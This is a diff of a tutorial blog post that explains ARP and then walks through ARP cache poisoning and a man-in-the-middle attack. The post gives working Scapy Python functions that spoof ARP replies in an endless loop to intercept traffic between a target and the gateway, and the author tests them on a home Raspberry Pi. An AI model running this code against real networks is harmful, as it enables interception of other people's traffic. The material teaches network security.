@@ -16,7 +16,7 @@ At the lowest level, a switch connects a bunch of hosts. If a protocol P on a ho
 
 
 ## ARP Messages
-In this blog post, we are mainly concerned with two types of ARP messages.
+In this blog post, we are mainly concerned with the following two types of ARP messages.
 
 1.	ARP Request, and
 2.	ARP Reply
@@ -28,10 +28,10 @@ The ARP packet has the following format.
 In IPv4 over Ethernet, the sender or receiver protocol address refers to the IP address of the sender or receiver. The hardware address refers to the 48-bit Ethernet address. To resolve a host with an IP address, say for example X.X.X.X, S broadcasts (Target hardware address is FF:FF:FF:FF:FF:FF or all 1s) out an ARP request with the sender protocol address field set to our IP address, say for example Y.Y.Y.Y, asking
 
 ```
-Who is X.X.X.X? tell Y.Y.Y.Y
+	Who is X.X.X.X? tell Y.Y.Y.Y
 ```
 
-All the hosts on the network check to see if the target IP address matches their address on receiving the ARP request. The host ‘X.X.X.X,’ on seeing that its IP address matches the one in the ARP request, sends out an ARP reply to Y.Y.Y.Y along with its Ethernet address. Once S receives the ARP request, it adds the Ethernet address of R to a cache table and starts sending out whatever packets protocol P has to send.
+All the hosts on the network check to see if the target IP address matches their address on receiving the ARP request. The host ‘X.X.X.X,’ on seeing that its IP address matches the one in the ARP request, sends out an ARP reply to ‘Y.Y.Y.Y’ along with its Ethernet address. Once S receives the ARP request, it adds the Ethernet address of R to a cache table and starts sending out whatever packets protocol P has to send.
 
 The following image gives an example of an ARP request and response. 
 
@@ -48,14 +48,14 @@ can send ARP request packet to the target. This can be done the following way.
 
 ```python
 def get_mac(ip):
-	# Create an ARP packet with the target as the destination 
+  # Create an ARP packet with the target as the destination 
   arp = Ether()/ARP(pdst=ip)
 	
   # Send the ARP request and get the response
   resp = srp1(arp)
 
   # Return the target's MAC address
-	return (resp[Ether].src)
+  return (resp[Ether].src)
 ```
 
 Once we get the target's MAC address, we can poison its cache by continously sending spoofed ARP responses. The function *poison_arp_cache* is looped forever until the user exits. This is because
@@ -63,28 +63,28 @@ the target might try to flush it's ARP cache and send out an ARP request. To pre
 
 ```python
 def poison_arp_cache(target_ip, target_mac_addr, spoofed_ip, spoofed_mac_addr=Ether().src):
-	# Create the ARP response
-	spoofed_resp = Ether()/ARP()
+  # Create the ARP response
+  spoofed_resp = Ether()/ARP()
 
-	# Set the destination MAC address
-	spoofed_resp[Ether].dst = target_mac_addr
-	spoofed_resp[ARP].hwdst = target_mac_addr
+  # Set the destination MAC address
+  spoofed_resp[Ether].dst = target_mac_addr
+  spoofed_resp[ARP].hwdst = target_mac_addr
 
-	# Set the destination IP address
-	spoofed_resp[ARP].pdst = target_ip
+  # Set the destination IP address
+  spoofed_resp[ARP].pdst = target_ip
 
-	# Set the spoofed MAC address
-	spoofed_resp[Ether].src = spoofed_mac_addr
-	spoofed_resp[ARP].hwsrc = spoofed_mac_addr
+  # Set the spoofed MAC address
+  spoofed_resp[Ether].src = spoofed_mac_addr
+  spoofed_resp[ARP].hwsrc = spoofed_mac_addr
 
-	# Set the spoofed IP address
-	spoofed_resp[ARP].psrc = spoofed_ip
+  # Set the spoofed IP address
+  spoofed_resp[ARP].psrc = spoofed_ip
 
-	# is-at (response)
-	spoofed_resp[ARP].op = 2
+  # is-at (response)
+  spoofed_resp[ARP].op = 2
 
-	#print(spoofed_resp[0].show())
-	sendp(spoofed_resp)
+  #print(spoofed_resp[0].show())
+  sendp(spoofed_resp)
 ```
 On trying the above code fragments with the target as a Raspberry Pi 3B+ on the same network as my 
 laptop, we get the following results.
@@ -99,11 +99,11 @@ We can see that we have successfully overwritten the target's cache table with m
 
 ```python
 def get_default_gateway_details():
-	# Send a request to any host outside our network with the TTL set to 0
-	p = srp1(Ether()/IP(dst="www.google.com", ttl = 0)/ICMP()/"XXXXXXXXXXX")
+  # Send a request to any host outside our network with the TTL set to 0
+  p = srp1(Ether()/IP(dst="www.google.com", ttl = 0)/ICMP()/"XXXXXXXXXXX")
 
-	# Return the source's IP address and MAC address
-	return p[IP].src, p[Ether].src
+  # Return the source's IP address and MAC address
+  return p[IP].src, p[Ether].src
 ```
 
 In the *get_default_gateway_ip* function, since the TTL is set to zero, the first host on the route which is the default gateway, responds with an ICMP error message {TTL Zero During Transit}. We then read the ICMP error message to get the default gateway's IP address, and MAC address.
@@ -112,21 +112,19 @@ To perform the MITM attack, we can use the following function.
 
 ```python
 def perform_mitm(target_ip):
-	# Get default gateway's network details
-	default_gateway_ip, default_gateway_mac = get_default_gateway_details()
+  # Get default gateway's network details
+  default_gateway_ip, default_gateway_mac = get_default_gateway_details()
 
-	# Get target's MAC address
-	target_mac = get_mac(target_ip)
+  # Get target's MAC address
+  target_mac = get_mac(target_ip)
 
-	# Keep sending spoofed ARP responses
-	while True:
-		# Poison target's ARP cache table
-		poison_arp_cache(target_ip, target_mac, default_gateway_ip)
-		# print(f"Sent ARP reply to {target_ip}")
+  # Keep sending spoofed ARP responses
+  while True:
+    # Poison target's ARP cache table
+    poison_arp_cache(target_ip, target_mac, default_gateway_ip)
 
-		# Poison default gateway's ARP cache table
-		poison_arp_cache(default_gateway_ip, default_gateway_mac, target_ip)
-		# print(f"Sent ARP reply to {default_gateway_ip}")
+    # Poison default gateway's ARP cache table
+    poison_arp_cache(default_gateway_ip, default_gateway_mac, target_ip)
 ```
 
 #### Side Note on Enabling Packet Forwarding
@@ -151,7 +149,7 @@ On windows, we must carry out the following steps.
 ```
 
 ### MITM Results
-On running the *perform_mitm* function, we now receive all communications between the gateway and the target. This can be seen in wireshark. On sending GET request to *www.resonous.com*, we can see the request in my laptop.
+On running the *perform_mitm* function, we now receive all communications between the gateway and the target. This can be seen in wireshark. On sending GET request to **www.resonous.com**, we can see the request in my laptop.
 
 ![ARP Packet Format](../../assets/images/arp-spoofing/curl-resonous.png)
 
